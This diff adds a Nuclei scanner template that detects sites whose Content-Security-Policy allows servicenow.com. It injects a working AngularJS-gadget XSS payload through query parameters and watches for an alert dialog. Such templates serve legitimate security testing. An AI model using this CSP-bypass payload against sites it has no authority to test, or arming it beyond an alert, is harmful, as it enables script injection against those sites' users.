@@ -1,0 +1,55 @@
+id: servicenow-kbcprod-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - ServiceNow KBCProd
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,servicenow-kbcprod
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "servicenow.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: servicenow_kbcprod_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "servicenow_kbcprod_csp_xss == true"
+# digest: 4a0a00473045022018b73965b2e3fe4ca716c45deb838ec0f55b5a9247d398b5be8b191a13450800022100b2616a8487359497659fb19e8b41c8b417435bf971bec3c4fef3cee7dc209e64:922c64590222798bb761d5b6d8e72950
